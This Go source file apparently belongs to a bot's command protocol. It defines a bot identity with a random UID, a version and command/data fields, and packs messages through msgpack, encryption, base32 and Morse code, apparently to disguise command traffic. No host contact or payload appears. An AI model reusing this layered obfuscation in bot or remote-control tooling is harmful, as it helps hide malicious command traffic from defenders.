package message

import (
	"bot/morse"
	"bytes"
	"encoding/base32"
	"fmt"
	"github.com/vmihailenco/msgpack"
	r "math/rand"
	"strings"
	"time"
)

type Bot struct {
	Uid  []uint8
	Version [8]uint8
	Com     Commands
}

type Commands struct {
	Command  []byte
	Data []byte
}

const (
	UidLength  = 16
	letterBytes = "0123456789abcdef"
	letterIdxBits = 6                    // 6 bits to represent a letter index
	letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
)

var (
	src = r.NewSource(time.Now().UnixNano())
)

// generateRandomUid generates a random hexadecimal string
// of length 16 used to identify the bot
func GenerateRandomUid() []byte {
	sb := strings.Builder{}
	sb.Grow(UidLength)
	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
	for i, cache, remain := UidLength-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			sb.WriteByte(letterBytes[idx])
			i--
		}
		cache >>= letterIdxBits
		remain--
	}
	
	return sb.Bytes();
}

func unmarshal(data []byte) Bot {
	fmt.Println("serialized data: ", data)
	var bot Bot
	enc := msgpack.NewDecoder(bytes.NewBuffer(data))
	fmt.Println("enc: ", enc)
	err := enc.Decode(&bot)
	if err != nil {
		panic(err)
	}
	return bot
}

func DeobfuscateData(data []byte) Bot {
	var encodedData []byte = morse.Decode(string(data))
	encryptedData, err := base32.StdEncoding.DecodeString(string(encodedData))
	if err != nil {
		panic(err)
	}
	return unmarshal(DecryptData(encryptedData))
}

func (b *Bot) marshal() []byte {
	var buf bytes.Buffer
	enc := msgpack.NewEncoder(&buf).StructAsArray(true)
	err := enc.Encode(&b)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func (b *Bot) ObfuscateData() []byte {
	var encrypted_data = EncryptData(b.marshal())
	var encoded_data = base32.StdEncoding.EncodeToString(encrypted_data)
	return morse.Encode(encoded_data)
}
